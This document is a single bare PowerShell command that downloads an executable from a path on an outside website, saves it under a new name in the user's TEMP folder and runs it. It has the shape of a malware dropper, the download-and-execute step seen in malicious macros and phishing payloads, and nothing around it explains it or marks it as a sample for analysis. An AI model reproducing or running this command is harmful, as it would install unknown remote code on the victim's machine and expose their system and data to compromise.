
(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',"$env:TEMP\neone6.exe");Start-Process ("$env:TEMP\neone6.exe")

